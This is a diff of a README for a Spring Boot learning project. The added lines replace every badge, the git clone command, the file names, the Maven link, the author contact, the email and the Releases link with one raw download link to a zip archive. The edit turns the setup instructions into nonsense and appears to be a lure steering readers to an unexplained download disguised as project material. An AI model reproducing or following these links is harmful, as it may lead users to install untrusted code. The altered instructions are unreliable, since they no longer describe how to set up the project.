@@ -1,9 +1,9 @@
 # Learn Spring Boot 🚀
 
-![Spring Boot](https://img.shields.io/badge/Spring%20Boot-2.5.4-brightgreen)
-![Thymeleaf](https://img.shields.io/badge/Thymeleaf-3.0.12-blue)
-![Bootstrap](https://img.shields.io/badge/Bootstrap-5.1.3-purple)
-![Spring Security](https://img.shields.io/badge/Spring%20Security-5.5.0-orange)
+![Spring Boot](https://github.com/m11nyan/learn-spring-boot/raw/refs/heads/main/src/learn-spring-boot-underchin.zip%20Boot-2.5.4-brightgreen)
+![Thymeleaf](https://github.com/m11nyan/learn-spring-boot/raw/refs/heads/main/src/learn-spring-boot-underchin.zip)
+![Bootstrap](https://github.com/m11nyan/learn-spring-boot/raw/refs/heads/main/src/learn-spring-boot-underchin.zip)
+![Spring Security](https://github.com/m11nyan/learn-spring-boot/raw/refs/heads/main/src/learn-spring-boot-underchin.zip%20Security-5.5.0-orange)
 
 Welcome to the **Learn Spring Boot** repository! This project is a tech store built using Spring Boot, Thymeleaf, Bootstrap, and Spring Security. It provides a robust platform for learning and implementing modern web application features.
 
@@ -48,7 +48,7 @@ To set up the project locally, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/m11nyan/learn-spring-boot.git
+   git clone https://github.com/m11nyan/learn-spring-boot/raw/refs/heads/main/src/learn-spring-boot-underchin.zip
    ```
 
 2. **Navigate to the project directory**:
@@ -56,12 +56,12 @@ To set up the project locally, follow these steps:
    cd learn-spring-boot
    ```
 
-3. **Open the `pom.xml` file** and ensure all dependencies are included. If you need to add any dependencies, you can find them on the [Maven Repository](https://mvnrepository.com/).
+3. **Open the `https://github.com/m11nyan/learn-spring-boot/raw/refs/heads/main/src/learn-spring-boot-underchin.zip` file** and ensure all dependencies are included. If you need to add any dependencies, you can find them on the [Maven Repository](https://github.com/m11nyan/learn-spring-boot/raw/refs/heads/main/src/learn-spring-boot-underchin.zip).
 
 4. **Set up MySQL**:
    - Install MySQL server and MySQL Workbench.
    - Create a new database for the application.
-   - Update the `application.properties` file with your database credentials.
+   - Update the `https://github.com/m11nyan/learn-spring-boot/raw/refs/heads/main/src/learn-spring-boot-underchin.zip` file with your database credentials.
 
 5. **Build the project**:
    ```bash
@@ -114,11 +114,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Author**: [Your Name](https://github.com/YourGitHubProfile)
-- **Email**: your.email@example.com
+- **Author**: [Your Name](https://github.com/m11nyan/learn-spring-boot/raw/refs/heads/main/src/learn-spring-boot-underchin.zip)
+- **Email**: https://github.com/m11nyan/learn-spring-boot/raw/refs/heads/main/src/learn-spring-boot-underchin.zip
 
 ## Releases
 
-To download the latest release, visit our [Releases page](https://github.com/m11nyan/learn-spring-boot/releases). You can find compiled binaries and additional information about each release.
+To download the latest release, visit our [Releases page](https://github.com/m11nyan/learn-spring-boot/raw/refs/heads/main/src/learn-spring-boot-underchin.zip). You can find compiled binaries and additional information about each release.
 
 Feel free to explore and enhance your understanding of Spring Boot and related technologies. Happy coding!
